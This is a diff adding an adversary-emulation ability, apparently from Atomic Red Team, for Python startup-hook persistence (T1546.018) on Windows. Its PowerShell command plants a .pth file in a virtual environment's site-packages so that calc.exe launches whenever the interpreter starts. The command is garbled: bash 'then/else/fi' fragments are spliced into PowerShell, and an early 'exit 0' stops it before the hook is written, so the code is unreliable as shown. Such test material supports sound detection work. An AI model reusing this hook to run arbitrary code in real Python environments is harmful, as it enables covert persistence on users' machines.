@@ -1,0 +1,61 @@
+- id: b4773c6b-3aa0-44a2-830a-b6ff594a0fb2
+  name: Python Startup Hook Execution via .pth (Windows)
+  description: Creates a Python startup hook using a .pth file inside a virtual environment
+    on Windows.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Get-Command python.exe -ErrorAction SilentlyContinue) { exit
+          0 } else { exit 1 }; then : ; else Write-Host "Python not found. Please
+          install it from https://www.python.org/downloads/windows/ or via ''winget
+          install Python.Python.3''"; fi; $TempDir = Join-Path $env:TEMP ("atomic_python_hook_"
+          + [guid]::NewGuid()); New-Item -ItemType Directory -Path $TempDir | Out-Null;
+          Set-Location $TempDir; Set-Content -Path "$env:TEMP\atomic_python_hook_path.txt"
+          -Value $TempDir; & "python.exe" -m venv env; $SitePackages = & "$TempDir\env\Scripts\python.exe"
+          -c "import site; print(site.getsitepackages()[1])"; "import os, subprocess;
+          os.environ.get(''CALC_SPAWNED'') or (os.environ.update({''CALC_SPAWNED'':''1''})
+          or subprocess.Popen([''calc.exe'']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth";
+          & "$TempDir\env\Scripts\python.exe" -c "print(''Interpreter started'')"'
+        cleanup: Get-Process CalculatorApp -ErrorAction SilentlyContinue | Stop-Process
+          -Force; if (Test-Path "$env:TEMP\atomic_python_hook_path.txt") {; $TempDir
+          = Get-Content "$env:TEMP\atomic_python_hook_path.txt"; Remove-Item -Recurse
+          -Force $TempDir -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\atomic_python_hook_path.txt"
+          -Force }
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1546.018
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      exe_name:
+        description: Executable to launch
+        type: string
+        default: calc.exe
+      python_path:
+        description: Path to Python interpreter
+        type: path
+        default: python.exe
+    dependencies:
+    - description: Ensure Python is installed
+      prereq_command: 'if (Get-Command #{python_path} -ErrorAction SilentlyContinue)
+        { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'Write-Host "Python not found. Please install it from https://www.python.org/downloads/windows/
+        or via ''winget install Python.Python.3''"
+
+        '
+    technique_created: '2025-05-22T19:20:46.740Z'
+    atomic_guid: b4773c6b-3aa0-44a2-830a-b6ff594a0fb2
+    import_timestamp: '2026-01-08T03:30:31.006880Z'
